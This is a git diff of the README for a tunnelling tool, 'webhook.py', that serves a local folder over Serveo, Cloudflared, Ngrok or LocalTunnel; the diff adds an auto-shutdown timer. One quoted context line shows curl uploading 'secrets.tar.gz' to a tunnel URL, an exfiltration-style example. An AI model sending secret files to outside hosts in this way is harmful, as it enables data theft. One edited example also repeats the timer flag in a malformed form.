@@ -60,7 +60,7 @@ It’s especially useful for:
 
 ## 🚀 Banner  
 ```bash
- python3 webhook.py -h
+❯ python3 webhook.py -h
 
      .->    (`-')  _<-.(`-')  (`-').->                      <-.(`-')  
  (`(`-')/`) ( OO).-/ __( OO)  (OO )__      .->        .->    __( OO)  
@@ -72,8 +72,8 @@ It’s especially useful for:
 `--'   '--' `------'`------' `--' `--'   `-----'    `-----' `--' '--' 
      Author: l0n3m4n | Version: 1.1.3 | Tunneling local Server 
 
-usage: webhook.py [-h] [-p PORT] [-d DIRECTORY] (--serveo | --cloudflared | --ngrok | --localtunnel)
-                  [--exiftool]
+usage: webhook.py [-h] [-p PORT] [-d DIRECTORY] [--shutdown-timer SHUTDOWN_TIMER] (--serveo |
+                  --cloudflared | --ngrok | --localtunnel) [--exiftool]
 
 📡 Serve a local directory and expose it via a tunnel (Serveo, Cloudflared, Ngrok, LocalTunnel).
 
@@ -82,6 +82,8 @@ options:
   -p, --port PORT       Local port to serve (default: 80)
   -d, --directory DIRECTORY
                         Directory to serve (default: current dir)
+  --shutdown-timer SHUTDOWN_TIMER
+                        Automatically shut down after N seconds
   --serveo              Use Serveo tunnel
   --cloudflared         Use Cloudflared tunnel
   --ngrok               Use Ngrok tunnel
@@ -90,10 +92,10 @@ options:
 
 
     Examples:                                                                                         
-      python3 webhook.py -p 8080 --serveo --exiftool                                        
-      python3 webhook.py -p 80 -d /var/www/html --cloudflared                                          
+      python3 webhook.py -p 8080 --serveo --exiftool -d ~/my-site --shutdown-timer 600 -shutdown-timer 600                 
+      python3 webhook.py -p 80 -d ~/my-site --cloudflared --exiftool                                  
       python3 webhook.py -p 3000 -d ~/my-site --ngrok                                                 
-      python3 webhook.py -p 8080 -d ~/my-site --localtunnel 
+      python3 webhook.py -p 8080 -d ~/my-site --localtunnel  
 ```
 
 ## 🛠 Requirements
@@ -182,7 +184,7 @@ curl -F "file=@secrets.tar.gz" https://abc123.cloudflareTunnel.com/upload
 - [x] Log incoming HTTP requests (IP, User-Agent, Time)
 
 ### ⏱️ Control & Automation
-- [ ] Implement auto-shutdown timer
+- [x] Implement auto-shutdown timer
 - [ ] Auto-reconnect/restart tunnels on failure
 - [ ] Add password protection for server access
 
